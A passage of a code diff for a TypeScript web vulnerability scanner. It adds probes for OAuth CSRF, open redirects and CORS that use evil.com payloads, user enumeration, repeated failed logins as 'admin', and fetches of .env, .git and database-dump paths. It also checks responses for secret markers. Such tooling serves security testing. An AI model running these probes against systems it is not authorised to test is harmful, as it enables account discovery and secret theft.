@@ -19,6 +19,26 @@ axiosRetry(axios, { retries: 3, retryDelay: axiosRetry.exponentialDelay });
 
 const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
 
+function safeJsonParse<T>(text: string | null | undefined, fallback: T): T {
+  if (!text) return fallback;
+  try {
+    return JSON.parse(text) as T;
+  } catch {
+    return fallback;
+  }
+}
+
+interface AiVulnResult {
+  isVulnerable: boolean;
+  confidence: number;
+  explanation: string;
+  gap_identified: string;
+  chain_potential: string | null;
+  discovered_user?: string | null;
+}
+
+const NULL_VULN: AiVulnResult = { isVulnerable: false, confidence: 0, explanation: '', gap_identified: '', chain_potential: null };
+
 export class AutomationEngine {
   private static wildcardBodies: Map<string, string> = new Map();
 
@@ -101,168 +121,334 @@ export class AutomationEngine {
     const hostname = new URL(asset).hostname;
     const memory = MemoryManager.getMemory(jobId, hostname);
     
-    // Generic Auth Flow Audit: Triggered by any SSO/Auth signatures
-    const authKeywords = ['auth', 'login', 'sso', 'saml', 'oauth', 'cognito', 'okta', 'auth0', 'firebase'];
-    if (tech.some(t => authKeywords.some(kw => t.toLowerCase().includes(kw)))) {
-      this.log(jobId, 'info', `Launching Autonomous Authentication Flow Auditor for ${asset}`);
+    const authKeywords = ['auth', 'login', 'sso', 'saml', 'oauth', 'cognito', 'okta', 'auth0', 'firebase', 'jwt', 'token', 'session', 'cookie'];
+    if (!tech.some(t => authKeywords.some(kw => t.toLowerCase().includes(kw)))) return;
+
+    this.log(jobId, 'info', `Phase 4a: Authentication Flow Auditor for ${asset}`);
+
+    // --- 4a-1: OAuth/SSO State CSRF Check ---
+    try {
+      const res = await axios.get(asset, { maxRedirects: 5, timeout: 10000, validateStatus: () => true });
+      const currentUrl = res.request?._redirectable?._currentUrl || '';
+      const state = currentUrl.match(/(?:state|RelayState|nonce)=([^&]+)/);
+      const clientId = currentUrl.match(/client_id=([^&]+)/);
+      const redirectUri = currentUrl.match(/redirect_uri=([^&]+)/);
       
-      // 1. Generic OAuth/SSO State CSRF Check
-      try {
-        const res = await axios.get(asset, { maxRedirects: 5, validateStatus: () => true });
-        const currentUrl = res.request?._redirectable?._currentUrl || '';
-        const state = currentUrl.match(/(?:state|RelayState)=([^&]+)/);
-        const clientId = currentUrl.match(/client_id=([^&]+)/);
+      if (clientId) MemoryManager.addIdentifier(jobId, hostname, 'client_id', clientId[1]);
+      if (redirectUri) MemoryManager.addIdentifier(jobId, hostname, 'redirect_uri', decodeURIComponent(redirectUri[1]));
+      
+      if (state && ai) {
+        const stateParam = currentUrl.includes('RelayState=') ? 'RelayState' : currentUrl.includes('nonce=') ? 'nonce' : 'state';
+        const callbackUrl = currentUrl.split('?')[0];
+        const testUrl = `${callbackUrl}?code=test_code&${stateParam}=attack_state`;
+        const csrfRes = await axios.get(testUrl, { timeout: 5000, validateStatus: () => true });
         
-        if (clientId) MemoryManager.addIdentifier(jobId, hostname, 'client_id', clientId[1]);
+        const analysisPrompt = `As an autonomous security agent (argila), analyze this Authentication Flow interaction for ${hostname}.
+        Target URL: ${testUrl}
+        Original Redirect URL: ${currentUrl}
+        Response Status: ${csrfRes.status}
+        Response Body (truncated): ${typeof csrfRes.data === 'string' ? csrfRes.data.substring(0, 1000) : JSON.stringify(csrfRes.data).substring(0, 1000)}
         
-        if (state && ai) {
-          const stateParam = currentUrl.includes('RelayState=') ? 'RelayState' : 'state';
-          const callbackUrl = currentUrl.split('?')[0];
-          const testUrl = `${callbackUrl}?code=test_code&${stateParam}=attack_state`;
-          const csrfRes = await axios.get(testUrl, { validateStatus: () => true });
-          
-          const analysisPrompt = `As an autonomous security agent (argila), analyze this Authentication Flow interaction for ${hostname}.
-          Target URL: ${testUrl}
-          Original Redirect URL: ${currentUrl}
-          Response Status: ${csrfRes.status}
-          Response Body (truncated): ${typeof csrfRes.data === 'string' ? csrfRes.data.substring(0, 1000) : JSON.stringify(csrfRes.data).substring(0, 1000)}
-          
-          [CRITICAL CONTEXT - TECH STACK]: ${memory.tech.join(', ')}
-          [CRITICAL CONTEXT - IDENTIFIERS]: ${JSON.stringify(memory.identifiers)}
+        [CRITICAL CONTEXT - TECH STACK]: ${memory.tech.join(', ')}
+        [CRITICAL CONTEXT - IDENTIFIERS]: ${JSON.stringify(memory.identifiers)}
+        Memory of Target Behavior:
+        - Previous Findings: ${JSON.stringify(memory.findings)}
+        
+        Determine if the application is vulnerable to OAuth/SSO State CSRF (Pre-Auth Account Takeover).
+        Chaining Logic: Can this finding be combined with previous identifiers or users to escalate impact?
+        Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": string, "gap_identified": string, "chain_potential": string | null }`;
 
-          Memory of Target Behavior:
-          - Previous Findings: ${JSON.stringify(memory.findings)}
-          
-          Determine if the application is vulnerable to OAuth/SSO State CSRF (Pre-Auth Account Takeover).
-          Chaining Logic: Can this finding be combined with previous identifiers or users to escalate impact?
-          Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": string, "gap_identified": string, "chain_potential": string | null }`;
+        const analysis = safeJsonParse<AiVulnResult>(await ai.generate(analysisPrompt, true), NULL_VULN);
+        this.log(jobId, 'info', `Auth CSRF check for ${asset}: ${analysis.isVulnerable ? 'VULNERABLE' : 'CLEAN'} (${analysis.confidence})`);
+        if (analysis.isVulnerable && analysis.confidence > 0.8) {
+          this.log(jobId, 'vuln', `CONFIRMED AUTH CSRF: ${analysis.gap_identified}`, { explanation: analysis.explanation, chain: analysis.chain_potential });
+          MemoryManager.addFinding(jobId, hostname, { type: 'Auth CSRF', asset, gap: analysis.gap_identified, chain: analysis.chain_potential });
+        }
+      }
 
-          const analysisText = await ai.generate(analysisPrompt, true);
-
-          if (analysisText) {
-            const analysis = JSON.parse(analysisText);
-            this.log(jobId, 'info', `Auth Flow Analysis for ${asset}: ${analysis.isVulnerable ? 'VULNERABLE' : 'NOT VULNERABLE'} (${analysis.confidence})`, { explanation: analysis.explanation });
-            if (analysis.isVulnerable && analysis.confidence > 0.8) {
-              this.log(jobId, 'vuln', `CONFIRMED AUTH CSRF: ${analysis.gap_identified}`, { explanation: analysis.explanation, chain: analysis.chain_potential });
-              MemoryManager.addFinding(jobId, hostname, { type: 'Auth CSRF', asset, gap: analysis.gap_identified, chain: analysis.chain_potential });
+      // --- 4a-1b: Open Redirect on redirect_uri ---
+      if (redirectUri) {
+        const decoded = decodeURIComponent(redirectUri[1]);
+        const attackRedirects = [
+          decoded.replace(/^(https?:\/\/)[^/]+/, '$1evil.com'),
+          decoded + '.evil.com',
+          decoded.replace(/\/$/, '') + '@evil.com',
+        ];
+        for (const attackUri of attackRedirects) {
+          try {
+            const testUrl = currentUrl.replace(redirectUri[1], encodeURIComponent(attackUri));
+            const openRedirRes = await axios.get(testUrl, { maxRedirects: 0, timeout: 5000, validateStatus: () => true });
+            const location = openRedirRes.headers['location'] || '';
+            if (location.includes('evil.com')) {
+              this.log(jobId, 'vuln', `CONFIRMED OPEN REDIRECT on redirect_uri: ${asset}`, { payload: attackUri, location });
+              MemoryManager.addFinding(jobId, hostname, { type: 'Open Redirect', asset, gap: 'OAuth redirect_uri allows arbitrary domain', chain_potential: 'Token theft via controlled redirect' });
+              break;
             }
+          } catch {}
+        }
+      }
+    } catch (e) {
+      this.log(jobId, 'warn', `Auth CSRF check failed for ${asset}: ${(e as Error).message}`);
+    }
+
+    // --- 4a-2: User Enumeration via Auth Endpoints ---
+    const knownUser = memory.discoveredUsers[0] || 'admin';
+    const randomUser = `user-${Math.random().toString(36).substring(7)}@example.com`;
+    
+    const enumEndpoints = [
+      { url: '/forgot-password', method: 'POST', body: { email: knownUser }, altBody: { email: randomUser } },
+      { url: '/api/auth/reset', method: 'POST', body: { username: knownUser }, altBody: { username: randomUser } },
+      { url: '/api/auth/login', method: 'POST', body: { username: knownUser, password: 'invalid' }, altBody: { username: randomUser, password: 'invalid' } },
+      { url: '/api/v1/auth/login', method: 'POST', body: { email: knownUser, password: 'invalid' }, altBody: { email: randomUser, password: 'invalid' } },
+      { url: '/login', method: 'POST', body: { username: knownUser, password: 'invalid' }, altBody: { username: randomUser, password: 'invalid' } },
+      { url: '/api/users/check', method: 'POST', body: { email: knownUser }, altBody: { email: randomUser } },
+      { url: '/register', method: 'POST', body: { email: knownUser, password: 'Test12345!' }, altBody: { email: randomUser, password: 'Test12345!' } },
+    ];
+
+    for (const endpoint of enumEndpoints) {
+      try {
+        const [res1, res2] = await Promise.all([
+          axios({ method: endpoint.method, url: `${asset}${endpoint.url}`, data: endpoint.body, timeout: 5000, validateStatus: () => true }),
+          axios({ method: endpoint.method, url: `${asset}${endpoint.url}`, data: endpoint.altBody, timeout: 5000, validateStatus: () => true })
+        ]);
+        
+        const isStatusDiff = res1.status !== res2.status;
+        const body1 = typeof res1.data === 'string' ? res1.data : JSON.stringify(res1.data);
+        const body2 = typeof res2.data === 'string' ? res2.data : JSON.stringify(res2.data);
+        const isBodyDiff = body1 !== body2;
+        const isTimingDiff = Math.abs((res1.headers['x-response-time'] ? parseInt(res1.headers['x-response-time'] as string) : 0) - (res2.headers['x-response-time'] ? parseInt(res2.headers['x-response-time'] as string) : 0)) > 200;
+
+        if ((isStatusDiff || isBodyDiff || isTimingDiff) && ai) {
+          const analysisPrompt = `Analyze these authentication responses for User Enumeration.
+          Endpoint: ${endpoint.url} | Method: ${endpoint.method}
+          
+          Response 1 (User: ${JSON.stringify(endpoint.body)}): Status: ${res1.status} | Body: ${body1.substring(0, 1000)}
+          Response 2 (User: ${JSON.stringify(endpoint.altBody)}): Status: ${res2.status} | Body: ${body2.substring(0, 1000)}
+          
+          [CONTEXT]: Tech: ${memory.tech.join(', ')} | Identifiers: ${JSON.stringify(memory.identifiers)} | Previous: ${JSON.stringify(memory.findings)}
+          
+          Determine if response difference reveals user existence. Check status codes, error messages, timing, and response body differences.
+          Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": string, "gap_identified": string, "discovered_user": string | null, "chain_potential": string | null }`;
+
+          const analysis = safeJsonParse<AiVulnResult>(await ai.generate(analysisPrompt, true), NULL_VULN);
+          if (analysis.isVulnerable && analysis.confidence > 0.8) {
+            this.log(jobId, 'vuln', `CONFIRMED USER ENUMERATION: ${analysis.gap_identified}`, { explanation: analysis.explanation, chain: analysis.chain_potential });
+            MemoryManager.addFinding(jobId, hostname, { type: 'User Enumeration', asset, gap: analysis.gap_identified, chain: analysis.chain_potential });
+            if (analysis.discovered_user) MemoryManager.addDiscoveredUser(jobId, hostname, analysis.discovered_user);
           }
         }
-      } catch (e) {}
-
-      // 2. Generic User Enumeration via Auth Endpoints
-      const knownUser = memory.discoveredUsers[0] || 'admin';
-      const randomUser = `user-${Math.random().toString(36).substring(7)}@example.com`;
-      
-      const enumEndpoints = [
-        { url: '/forgot-password', method: 'POST', body: { email: knownUser }, altBody: { email: randomUser } },
-        { url: '/api/auth/reset', method: 'POST', body: { username: knownUser }, altBody: { username: randomUser } }
-      ];
-      for (const endpoint of enumEndpoints) {
-        try {
-          const res1 = await axios({
-            method: endpoint.method,
-            url: `${asset}${endpoint.url}`,
-            data: endpoint.body,
-            validateStatus: () => true
-          });
-          
-          const res2 = await axios({
-            method: endpoint.method,
-            url: `${asset}${endpoint.url}`,
-            data: endpoint.altBody,
-            validateStatus: () => true
-          });
-          
-          // Only analyze if there's a difference between the two responses
-          const isStatusDiff = res1.status !== res2.status;
-          const isBodyDiff = JSON.stringify(res1.data) !== JSON.stringify(res2.data);
-
-          if ((isStatusDiff || isBodyDiff) && ai) {
-            const analysisPrompt = `Analyze these authentication responses for User Enumeration.
-            Endpoint: ${endpoint.url}
-            Method: ${endpoint.method}
-            
-            Response 1 (User: ${JSON.stringify(endpoint.body)}):
-            Status: ${res1.status}
-            Body: ${typeof res1.data === 'string' ? res1.data.substring(0, 1000) : JSON.stringify(res1.data).substring(0, 1000)}
-            
-            Response 2 (User: ${JSON.stringify(endpoint.altBody)}):
-            Status: ${res2.status}
-            Body: ${typeof res2.data === 'string' ? res2.data.substring(0, 1000) : JSON.stringify(res2.data).substring(0, 1000)}
-            
-            Memory of Target Behavior:
-            - Tech Stack: ${memory.tech.join(', ')}
-            - Identifiers: ${JSON.stringify(memory.identifiers)}
-            - Previous Findings: ${JSON.stringify(memory.findings)}
-            
-            Determine if the difference between these responses reveals the existence of a user account.
-            Chaining Logic: Can this finding be combined with previous identifiers or users to escalate impact?
-            Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": string, "gap_identified": string, "discovered_user": string | null, "chain_potential": string | null }`;
-
-            const analysisText = await ai.generate(analysisPrompt, true);
-
-            if (analysisText) {
-              const analysis = JSON.parse(analysisText);
-              if (analysis.isVulnerable && analysis.confidence > 0.8) {
-                this.log(jobId, 'vuln', `CONFIRMED USER ENUMERATION: ${analysis.gap_identified}`, { explanation: analysis.explanation, chain: analysis.chain_potential });
-                MemoryManager.addFinding(jobId, hostname, { type: 'User Enumeration', asset, gap: analysis.gap_identified, chain: analysis.chain_potential });
-                if (analysis.discovered_user) MemoryManager.addDiscoveredUser(jobId, hostname, analysis.discovered_user);
-              }
-            }
-          }
-        } catch (e) {}
-      }
+      } catch {}
     }
+
+    // --- 4a-3: CORS Misconfiguration Audit ---
+    this.log(jobId, 'info', `Phase 4a: CORS Misconfiguration Audit for ${asset}`);
+    const corsOrigins = [
+      `https://evil.com`,
+      `https://${hostname}.evil.com`,
+      `https://evil-${hostname}`,
+      `null`,
+      `https://${hostname}%60.evil.com`,
+    ];
+    for (const origin of corsOrigins) {
+      try {
+        const res = await axios.get(asset, {
+          timeout: 5000,
+          validateStatus: () => true,
+          headers: { 'Origin': origin }
+        });
+        const acao = res.headers['access-control-allow-origin'];
+        const acac = res.headers['access-control-allow-credentials'];
+        if (acao && (acao === origin || acao === '*')) {
+          const isCritical = acac === 'true' && acao !== '*';
+          const severity = isCritical ? 'CRITICAL' : 'MEDIUM';
+          this.log(jobId, 'vuln', `CORS Misconfiguration (${severity}): ${asset} reflects origin ${origin}`, { acao, acac, origin });
+          MemoryManager.addFinding(jobId, hostname, {
+            type: 'CORS Misconfiguration',
+            asset,
+            gap: `Reflects arbitrary origin ${origin} with ${acac === 'true' ? 'credentials' : 'no credentials'}`,
+            chain_potential: isCritical ? 'Full session hijack via cross-origin credential theft' : 'Data leakage via cross-origin reads'
+          });
+          break;
+        }
+      } catch {}
+    }
+
+    // --- 4a-4: JWT/Token Weakness Audit ---
+    this.log(jobId, 'info', `Phase 4a: JWT/Token Audit for ${asset}`);
+    try {
+      const loginRes = await axios.get(asset, { timeout: 5000, validateStatus: () => true });
+      const bodyStr = typeof loginRes.data === 'string' ? loginRes.data : JSON.stringify(loginRes.data);
+      const cookies = Array.isArray(loginRes.headers['set-cookie']) ? loginRes.headers['set-cookie'].join('; ') : (loginRes.headers['set-cookie'] || '');
+
+      // Check for JWT in response body or cookies
+      const jwtPattern = /eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g;
+      const jwts = [...(bodyStr.match(jwtPattern) || []), ...(cookies.match(jwtPattern) || [])];
+      
+      for (const jwt of [...new Set(jwts)].slice(0, 3)) {
+        try {
+          const parts = jwt.split('.');
+          const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString());
+          const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString());
+
+          const issues: string[] = [];
+          if (header.alg === 'none' || header.alg === 'None') issues.push('Algorithm "none" — signature bypass');
+          if (header.alg === 'HS256' && header.jwk) issues.push('JWK embedded in header — potential key confusion');
+          if (!payload.exp) issues.push('No expiration claim — token never expires');
+          if (payload.exp && payload.exp - (payload.iat || 0) > 86400 * 30) issues.push('Token lifetime > 30 days');
+          if (payload.admin === true || payload.role === 'admin') issues.push('Privileged claims in token — test for forgery');
+
+          if (issues.length > 0) {
+            this.log(jobId, 'vuln', `JWT WEAKNESS on ${asset}: ${issues.join('; ')}`, { header, payloadClaims: Object.keys(payload) });
+            MemoryManager.addFinding(jobId, hostname, {
+              type: 'JWT Weakness',
+              asset,
+              gap: issues.join('; '),
+              chain_potential: issues.some(i => i.includes('none') || i.includes('forgery')) ? 'Authentication bypass via token forgery' : 'Session persistence abuse'
+            });
+          }
+        } catch {}
+      }
+
+      // --- 4a-5: Session Cookie Security Audit ---
+      if (cookies) {
+        const cookieIssues: string[] = [];
+        const sessionCookies = cookies.split(/,(?=\s*\w+=)/).filter(c => /session|token|auth|sid|jwt/i.test(c));
+        for (const cookie of sessionCookies) {
+          if (!cookie.toLowerCase().includes('httponly')) cookieIssues.push(`Missing HttpOnly: ${cookie.split('=')[0]}`);
+          if (!cookie.toLowerCase().includes('secure') && asset.startsWith('https')) cookieIssues.push(`Missing Secure flag: ${cookie.split('=')[0]}`);
+          if (!cookie.toLowerCase().includes('samesite')) cookieIssues.push(`Missing SameSite: ${cookie.split('=')[0]}`);
+        }
+        if (cookieIssues.length > 0) {
+          this.log(jobId, 'vuln', `SESSION COOKIE ISSUES on ${asset}: ${cookieIssues.length} finding(s)`, { issues: cookieIssues });
+          MemoryManager.addFinding(jobId, hostname, {
+            type: 'Insecure Session Cookie',
+            asset,
+            gap: cookieIssues.join('; '),
+            chain_potential: 'Session hijack via XSS (missing HttpOnly) or CSRF (missing SameSite)'
+          });
+        }
+      }
+    } catch {}
+
+    // --- 4a-6: Security Header Audit ---
+    this.log(jobId, 'info', `Phase 4a: Security Header Audit for ${asset}`);
+    try {
+      const res = await axios.get(asset, { timeout: 5000, validateStatus: () => true });
+      const headers = res.headers;
+      const missingHeaders: string[] = [];
+      
+      const requiredHeaders: Record<string, string> = {
+        'strict-transport-security': 'HSTS',
+        'x-content-type-options': 'X-Content-Type-Options',
+        'x-frame-options': 'X-Frame-Options',
+        'content-security-policy': 'CSP',
+      };
+      for (const [header, label] of Object.entries(requiredHeaders)) {
+        if (!headers[header]) missingHeaders.push(label);
+      }
+      if (missingHeaders.length > 0) {
+        this.log(jobId, 'warn', `Missing security headers on ${asset}: ${missingHeaders.join(', ')}`);
+        MemoryManager.addFinding(jobId, hostname, {
+          type: 'Missing Security Headers',
+          asset,
+          gap: `Missing: ${missingHeaders.join(', ')}`,
+          chain_potential: missingHeaders.includes('CSP') ? 'XSS exploitation easier without CSP' : null
+        });
+      }
+    } catch {}
   }
 
   private static async auditBusinessLogic(jobId: string, asset: string, tech: string[], ai: OllamaClient | null) {
     const hostname = new URL(asset).hostname;
     const memory = MemoryManager.getMemory(jobId, hostname);
     
-    // Generic Business Logic Audit: Triggered by E-commerce or Financial signatures
-    const bizKeywords = ['shop', 'store', 'cart', 'checkout', 'price', 'shopify', 'magento', 'stripe'];
-    if (tech.some(t => bizKeywords.some(kw => t.toLowerCase().includes(kw)))) {
-      this.log(jobId, 'info', `Launching Autonomous Business Logic Auditor for ${asset}`);
-      
-      // 1. Price/Logic Integrity Check
-      const logicEndpoints = ['/products.json', '/api/v1/products', '/cart.js'];
-      for (const ep of logicEndpoints) {
-        try {
-          const res = await axios.get(`${asset}${ep}`, { validateStatus: () => true });
-          // Only analyze if it actually returns JSON or product-like data
-          const isJson = String(res.headers['content-type'] ?? '').includes('application/json');
-          const bodyStr = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
-          const hasProductMarkers = bodyStr.includes('price') || bodyStr.includes('variant') || bodyStr.includes('sku');
+    const bizKeywords = ['shop', 'store', 'cart', 'checkout', 'price', 'shopify', 'magento', 'stripe', 'woocommerce', 'bigcommerce', 'payment', 'order', 'invoice'];
+    if (!tech.some(t => bizKeywords.some(kw => t.toLowerCase().includes(kw)))) return;
 
-          if (isJson && hasProductMarkers && ai) {
-            const analysisPrompt = `Analyze this e-commerce product data for Business Logic flaws on ${hostname}.
-            Endpoint: ${ep}
-            Response Body (truncated): ${typeof res.data === 'string' ? res.data.substring(0, 2000) : JSON.stringify(res.data).substring(0, 2000)}
-            
-            [CRITICAL CONTEXT - TECH STACK]: ${memory.tech.join(', ')}
-            [CRITICAL CONTEXT - IDENTIFIERS]: ${JSON.stringify(memory.identifiers)}
+    this.log(jobId, 'info', `Phase 4a: Business Logic Auditor for ${asset}`);
 
-            Memory of Target Behavior:
-            - Previous Findings: ${JSON.stringify(memory.findings)}
-            
-            Look for price manipulation, hidden discount codes, or logic bypasses.
-            Chaining Logic: Can this finding be combined with previous identifiers or users to escalate impact?
-            Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": string, "gap_identified": string, "chain_potential": string | null }`;
+    // 1. Price/Logic Integrity Check — expanded endpoints
+    const logicEndpoints = [
+      '/products.json', '/api/v1/products', '/cart.js', '/cart.json',
+      '/api/cart', '/api/v1/cart', '/api/checkout', '/api/v1/orders',
+      '/collections.json', '/api/products', '/api/v2/products'
+    ];
+    for (const ep of logicEndpoints) {
+      try {
+        const res = await axios.get(`${asset}${ep}`, { timeout: 5000, validateStatus: () => true });
+        const isJson = String(res.headers['content-type'] ?? '').includes('application/json');
+        const bodyStr = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
+        const hasProductMarkers = bodyStr.includes('price') || bodyStr.includes('variant') || bodyStr.includes('sku') || bodyStr.includes('amount') || bodyStr.includes('total');
 
-            const analysisText = await ai.generate(analysisPrompt, true);
+        if (isJson && hasProductMarkers && ai) {
+          const analysisPrompt = `Analyze this e-commerce data for Business Logic flaws on ${hostname}.
+          Endpoint: ${ep}
+          Response Body (truncated): ${bodyStr.substring(0, 2000)}
+          
+          [CONTEXT]: Tech: ${memory.tech.join(', ')} | Identifiers: ${JSON.stringify(memory.identifiers)} | Findings: ${JSON.stringify(memory.findings)}
+          
+          Look for: price manipulation, negative quantities, hidden discount codes, coupon stacking, race conditions, logic bypasses, internal pricing data exposure.
+          Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": string, "gap_identified": string, "chain_potential": string | null }`;
 
-            if (analysisText) {
-              const analysis = JSON.parse(analysisText);
-              if (analysis.isVulnerable && analysis.confidence > 0.8) {
-                this.log(jobId, 'vuln', `CONFIRMED BUSINESS LOGIC FLAW: ${analysis.gap_identified}`, { explanation: analysis.explanation, chain: analysis.chain_potential });
-                MemoryManager.addFinding(jobId, hostname, { type: 'Business Logic Flaw', asset, gap: analysis.gap_identified, chain: analysis.chain_potential });
-              }
-            }
+          const analysis = safeJsonParse<AiVulnResult>(await ai.generate(analysisPrompt, true), NULL_VULN);
+          if (analysis.isVulnerable && analysis.confidence > 0.8) {
+            this.log(jobId, 'vuln', `CONFIRMED BUSINESS LOGIC FLAW: ${analysis.gap_identified}`, { explanation: analysis.explanation, chain: analysis.chain_potential });
+            MemoryManager.addFinding(jobId, hostname, { type: 'Business Logic Flaw', asset, gap: analysis.gap_identified, chain: analysis.chain_potential });
           }
-        } catch (e) {}
-      }
+        }
+      } catch {}
     }
+
+    // 2. GraphQL Introspection Check
+    try {
+      const gqlEndpoints = ['/graphql', '/api/graphql', '/v1/graphql', '/gql'];
+      for (const gqlEp of gqlEndpoints) {
+        try {
+          const introspectionRes = await axios.post(`${asset}${gqlEp}`, {
+            query: '{ __schema { types { name fields { name } } } }'
+          }, { timeout: 5000, validateStatus: () => true });
+          const bodyStr = typeof introspectionRes.data === 'string' ? introspectionRes.data : JSON.stringify(introspectionRes.data);
+          if (introspectionRes.status === 200 && bodyStr.includes('__schema')) {
+            this.log(jobId, 'vuln', `GRAPHQL INTROSPECTION ENABLED: ${asset}${gqlEp}`, { schemaPreview: bodyStr.substring(0, 500) });
+            MemoryManager.addFinding(jobId, hostname, {
+              type: 'GraphQL Introspection',
+              asset: `${asset}${gqlEp}`,
+              gap: 'GraphQL introspection enabled — full schema disclosure',
+              chain_potential: 'Map all queries/mutations for targeted exploitation'
+            });
+            break;
+          }
+        } catch {}
+      }
+    } catch {}
+
+    // 3. Rate Limit / Account Lockout Check
+    try {
+      const loginEndpoints = ['/api/auth/login', '/login', '/api/v1/auth/login'];
+      for (const ep of loginEndpoints) {
+        let lastStatus = 0;
+        let rateLimited = false;
+        for (let i = 0; i < 10; i++) {
+          try {
+            const res = await axios.post(`${asset}${ep}`, {
+              username: 'admin', password: `wrong-pass-${i}`
+            }, { timeout: 3000, validateStatus: () => true });
+            lastStatus = res.status;
+            if (res.status === 429 || res.status === 403) { rateLimited = true; break; }
+          } catch { break; }
+        }
+        if (!rateLimited && lastStatus > 0 && lastStatus !== 404) {
+          this.log(jobId, 'vuln', `NO RATE LIMITING on ${asset}${ep} — 10 failed logins accepted`, { lastStatus });
+          MemoryManager.addFinding(jobId, hostname, {
+            type: 'Missing Rate Limit',
+            asset: `${asset}${ep}`,
+            gap: 'No rate limiting or account lockout on login endpoint',
+            chain_potential: 'Brute-force attack viable with discovered usernames'
+          });
+          break;
+        }
+      }
+    } catch {}
   }
 
   static async startJob(targetUrl: string) {
@@ -568,112 +754,270 @@ export class AutomationEngine {
           findings: memory.findings.map(f => f.type)
         };
 
-        // 1. Specialized Auditors (Auth, Business Logic, Sensitive Files)
+        // --- 4a: Specialized Auditors (Auth, CORS, JWT, Session, Business Logic) ---
+        this.log(jobId, 'info', 'Phase 4a: Running specialized auditors');
         for (const stack of techStacks) {
           const tech = stack.results?.tech || [];
           await this.auditAuthenticationFlow(jobId, stack.asset, tech, ai);
           await this.auditBusinessLogic(jobId, stack.asset, tech, ai);
         }
+        // Run auth/session audits on the primary target even without tech signatures
+        if (techStacks.length === 0) {
+          await this.auditAuthenticationFlow(jobId, targetUrl, ['auth', 'session'], ai);
+        }
 
-        // 2. Sensitive File Disclosure Auditor (Crucial for high-impact leaks)
+        // --- 4b: Sensitive File & Data Disclosure Auditor ---
+        this.log(jobId, 'info', 'Phase 4b: Sensitive File & Data Disclosure Audit');
+
+        // Expanded sensitive file detection patterns
+        const sensitivePathPatterns = [
+          /\.(env|env\.local|env\.production|env\.staging|env\.dev)$/i,
+          /\.(git|gitignore|gitconfig|git\/config|git\/HEAD)$/i,
+          /\.(config|cfg|ini|yml|yaml|toml|xml|properties)$/i,
+          /\.(bak|backup|old|orig|swp|sav|tmp|temp)$/i,
+          /\.(sql|dump|db|sqlite|sqlite3|mdb)$/i,
+          /\.(log|error_log|access_log|debug\.log)$/i,
+          /\.(pem|key|crt|cert|p12|pfx|jks)$/i,
+          /\.(htpasswd|htaccess|passwd|shadow)$/i,
+        ];
+        const sensitiveKeywords = [
+          'phpinfo', '.env', 'metrics', 'debug', 'actuator', 'health',
+          'swagger', 'api-docs', 'openapi', '.well-known', 'server-status',
+          'server-info', 'wp-config', 'config.php', 'database.yml',
+          'credentials', 'secret', 'backup', '.DS_Store', 'Thumbs.db',
+          'crossdomain.xml', 'clientaccesspolicy.xml', 'elmah.axd',
+          'trace.axd', 'web.config', 'application.properties',
+        ];
+
         const sensitiveFiles = endpoints.filter(e => 
-          e.url.match(/\.(env|git|config|phpinfo|metrics|debug|internal|dashboard|v1|v2|graphql)$/) ||
-          e.url.includes('phpinfo') || e.url.includes('.env') || e.url.includes('metrics') || e.url.includes('debug')
+          sensitivePathPatterns.some(p => p.test(e.url)) ||
+          sensitiveKeywords.some(kw => e.url.toLowerCase().includes(kw))
         );
 
-        for (const sf of sensitiveFiles) {
+        // Also probe known sensitive paths directly on discovered assets
+        const directProbes = [
+          '/.env', '/.git/config', '/.git/HEAD', '/phpinfo.php',
+          '/server-status', '/server-info', '/.htpasswd', '/wp-config.php',
+          '/actuator/env', '/actuator/health', '/actuator/beans',
+          '/swagger-ui.html', '/swagger.json', '/api-docs',
+          '/debug', '/metrics', '/trace', '/.DS_Store',
+          '/backup.sql', '/database.sql', '/dump.sql',
+          '/crossdomain.xml', '/robots.txt', '/sitemap.xml',
+          '/api/v1/debug', '/api/config', '/admin/config',
+          '/info', '/health', '/status', '/.well-known/openid-configuration',
+        ];
+
+        // Build full list of sensitive endpoints to check
+        const probeUrls = new Set(sensitiveFiles.map(sf => sf.url));
+        for (const asset of discoveredAssets.slice(0, 5)) {
+          for (const probe of directProbes) {
+            try { probeUrls.add(new URL(probe, asset).href); } catch {}
+          }
+        }
+
+        const sensitiveContentMarkers = [
+          'DB_', 'AWS_', 'SECRET', 'PASSWORD', 'PRIVATE_KEY', 'API_KEY', 'ACCESS_KEY',
+          'PHP Version', 'System Info', 'metrics_', 'debug_mode',
+          'mysql_connect', 'pg_connect', 'redis://', 'mongodb://',
+          'BEGIN RSA', 'BEGIN PRIVATE', 'BEGIN CERTIFICATE',
+          'jdbc:', 'amqp://', 'smtp://',
+          'DJANGO_SECRET', 'FLASK_SECRET', 'JWT_SECRET', 'SESSION_SECRET',
+          'STRIPE_SECRET', 'TWILIO_AUTH', 'SENDGRID_API',
+          'Authorization:', 'Bearer ', 'Basic ',
+        ];
+
+        let sensitiveFileCount = 0;
+        for (const sfUrl of probeUrls) {
+          if (sensitiveFileCount >= 20) break; // Cap to avoid excessive requests
           try {
-            const hostname = new URL(sf.url).hostname;
-            const res = await axios.get(sf.url, { timeout: 5000, validateStatus: () => true });
+            const sfHostname = new URL(sfUrl).hostname;
+            const res = await axios.get(sfUrl, { timeout: 5000, validateStatus: () => true });
+            if (res.status === 404 || res.status === 403) continue;
             const bodyStr = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
             
-            // Filter out wildcard 200s
-            if (this.isWildcardResponse(hostname, bodyStr)) continue;
+            if (this.isWildcardResponse(sfHostname, bodyStr)) continue;
 
-            // Heuristic check for sensitive content
-            const hasSensitiveContent = 
-              bodyStr.includes('DB_') || bodyStr.includes('AWS_') || bodyStr.includes('SECRET') || 
-              bodyStr.includes('PHP Version') || bodyStr.includes('System Info') || 
-              bodyStr.includes('metrics_') || bodyStr.includes('debug_mode');
+            const matchedMarkers = sensitiveContentMarkers.filter(m => bodyStr.includes(m));
+            const hasSensitiveContent = matchedMarkers.length > 0;
+
+            // Git config file — verify without AI
